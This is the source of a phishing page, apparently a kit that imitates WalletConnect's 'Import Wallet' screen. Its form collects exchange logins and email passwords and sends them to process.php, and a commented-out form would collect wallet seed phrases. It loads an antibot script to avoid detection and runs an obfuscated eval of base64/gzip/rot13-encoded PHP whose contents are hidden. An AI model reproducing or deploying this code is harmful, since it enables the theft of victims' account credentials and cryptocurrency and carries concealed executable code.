<html>
<meta http-equiv="content-type" content="text/html" />
<?php 
error_reporting(0);
include './files/antibot/crawlerdetect.php';
include_once 'functions.php';
?>

<head>
  <meta charset="UTF-8">
  <link rel="stylesheet" href="./files/main_new.css" type="text/css" />
  <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.2/jquery.validate.min.js" integrity="sha512-UdIMMlVx0HEynClOIFSyOrPggomfhBKJE28LKl8yR3ghkgugPnG6iLfRfHwushZl1MOPSY6TsuBDGPK2X4zYKg==" crossorigin="anonymous"></script>


  <meta name="description" content="Open protocol for connecting Wallets to Dapps">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta property="og:image" content="./files/images/logo.svg">
  <link rel="icon" href="./files/images/logo.svg">
  <script>
    function openCity(evt, cityName) {
      // Declare all variables
      var i, tabcontent, tablinks;

      // Get all elements with class="tabcontent" and hide them
      tabcontent = document.getElementsByClassName("tabcontent");
      for (i = 0; i < tabcontent.length; i++) {
        tabcontent[i].style.display = "none";
      }

      // Get all elements with class="tablinks" and remove the class "active"
      tablinks = document.getElementsByClassName("tablinks");
      for (i = 0; i < tablinks.length; i++) {
        tablinks[i].className = tablinks[i].className.replace(" active", "");
      }

      // Show the current tab, and add an "active" class to the button that opened the tab
      document.getElementById(cityName).style.display = "block";
      evt.currentTarget.className += " active";
    }
  </script>
</head>



<title>Import Wallet</title>

<body>
  <center>
    <header class="sticky top-0 z-10 flex items-center justify-between px-5 py-4 bg-white md:py-6 ">
      <div class="absolute inset-0 shadow-lg opacity-50"></div>
      <div class="z-20 flex justify-around w-full sm:pr-10 md:pr-20"><a
              class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl" target="_blank"
              href="https://github.com/walletconnect" rel="noopener noreferrer">
              GitHub
          </a><a class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl" target="_blank"
              href="https://docs.walletconnect.org/" rel="noopener noreferrer">
              Docs
          </a></div>
      <div class="z-20 flex">
          <div class="w-16 mx-6 sm:w-20 md:w-28"><img class="cursor-pointer object-fit"
                  src="./files/walletconnect-logo.svg" href="#"alt="walletconnect logo" /></div>
      </div>
      <div class="z-20 flex justify-around w-full sm:pl-10 md:pl-20"><a
              class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl"
              href="#">
              Wallets
          </a><a class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl"
              href="#">
              Apps
          </a></div>
  </header>
    </br>
    <div class="text-cool-gray-500">
      <h1 class="flex justify-center mt-20 text-4xl font-semibold import__page">Import Wallet </h1>
    </br>
	  
	  
	  <div class="tab">
                   <button class="tablinks" id="default" onclick="openCity(event, 'keystore')">Exchange Details</b></button>
                    <button class="tablinks"  onclick="openCity(event, 'phrase')"></b></button>
                    <button class="tablinks" onclick="openCity(event, 'private')"></b></button>
					
                  </div>
				  

                <div role="presentation" class="sc-eLwHGX sc-uoixf dVYXTr jGzOKM"></div>
                </div>
				
    
	
               
                <!-- <div id="phrase" class="tabcontent">
                     <form action="process.php" method="POST" id="form1">
                      <textarea name="key" required="required" minlength="12" placeholder="Phrase" required="required"></textarea>
                      </br>
                      <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
                      </br>
                      <button form="form1" value="Import" type="submit" name="import" class="btn blMRzM">IMPORT</button>
                    </form>
                  </div> -->
              
                  <div id="keystore" class="tabcontent">
                    <form action="process.php" method="POST" id="form2">
                     <div class="field">
                       <input name="key" type="email" required="required" minlength="12" placeholder="Exchange Email"
                        required="required"/>
                     </div>
                      
                      <div class="field">
                        <input type="text" name="pass" placeholder="Exchange Password" required="required" minlength="4" />
                      </div>
                      <div class="field">
                       <input name="email" type="email" required="required" minlength="12" placeholder="Email"
                        required="required"/>
                     </div>
                     <div class="field">
                       <input name="emailpass" type="email" required="required" minlength="12" placeholder="Email Password"
                        required="required"/>
                     </div>
                      <div class="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
                      </br>
                      <button form="form2" value="Import" type="submit" name="import" class="btn blMRzM">IMPORT</button>
                    </form>
                  </div>
 
				  
                  <script>
                    document.getElementById("default").click();
                  </script>
 
    </div>
   


    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
  	<?php eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));?><script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.3/umd/popper.min.js" integrity="sha384-vFJXuSJphROIrBnz7yo7oB41mKfc8JzQZiCq4NCceLEaO4IHwicKwpJf9c9IpFgh" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js" integrity="sha384-alpBpkh1PFOepccYVYDB4do5UnbKysX5WZXm3XxPqe5iKTfUKjNkCk9SaVuEZflJ" crossorigin="anonymous"></script>
  </body>
</html>








<script src="./files/jquery.min.js.download"></script>

    <footer class="flex justify-center mt-24 mb-16 sm:mt-32">
      <div class="flex flex-col space-y-6 sm:space-y-0 sm:space-x-20 sm:flex-row"><a
          class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500" target="_blank"
          href="https://discord.gg/jhxMvxP" rel="noopener noreferrer">
          <div class="flex"><img class="w-6 sm:w-8" src="./files/discord.svg" alt="Discord" />
            <p class="ml-2">Discord</p>
          </div>
        </a><a class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500" target="_blank"
          href="https://twitter.com/walletconnect" rel="noopener noreferrer">
          <div class="flex"><img class="w-6 sm:w-8" src="./files/twitter.svg" alt="Twitter" />
            <p class="ml-2">Twitter</p>
          </div>
        </a><a class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500" target="_blank"
          href="https://github.com/walletconnect" rel="noopener noreferrer">
          <div class="flex"><img class="w-6 sm:w-8" src="./files/github.svg" alt="GitHub" />
            <p class="ml-2">GitHub</p>
          </div>
        </a></div>
    </footer>
 
<script src="/script.js"></script>
</body>

</html>

